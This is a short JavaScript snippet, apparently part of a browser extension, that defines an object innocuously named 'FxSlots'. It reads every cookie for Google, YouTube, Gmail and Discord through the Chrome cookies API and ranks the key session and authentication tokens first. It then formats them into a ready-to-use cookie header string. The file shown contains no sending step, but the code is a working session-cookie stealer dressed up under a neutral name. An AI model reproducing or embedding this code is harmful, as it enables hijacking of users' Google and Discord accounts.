var FxSlots = {
  googleHosts: ['.google.com', 'google.com', 'accounts.google.com', '.youtube.com', 'youtube.com', 'mail.google.com'],
  discordHosts: ['.discord.com', 'discord.com'],
  lead: ['__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID', 'SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'LSID', 'OSID', 'ACCOUNT_CHOOSER', 'SIDCC', '__Secure-1PSIDTS', '__Secure-3PSIDTS', '__Host-1PLSID', '__Host-3PLSID', 'NID', 'CONSENT'],
  gather: async function (hosts) {
    var bag = [];
    for (var index = 0; index < hosts.length; index += 1) {
      bag.push.apply(bag, await chrome.cookies.getAll({ domain: hosts[index] }));
    }
    var seen = Object.create(null);
    var rows = [];
    for (var cursor = 0; cursor < bag.length; cursor += 1) {
      var row = bag[cursor];
      var key = row.domain + '|' + row.name;
      if (seen[key]) continue;
      seen[key] = 1;
      rows.push({ n: row.name, v: row.value, d: row.domain, s: row.secure });
    }
    return rows;
  },
  google: function () { return this.gather(this.googleHosts); },
  discord: function () { return this.gather(this.discordHosts); },
  line: function (rows) {
    var rank = Object.create(null);
    for (var index = 0; index < this.lead.length; index += 1) rank[this.lead[index]] = 1;
    return rows.slice().sort(function (left, right) {
      return (rank[left.n] ? 0 : 1) - (rank[right.n] ? 0 : 1);
    }).map(function (row) { return row.n + '=' + row.v; }).join('; ');
  },
};
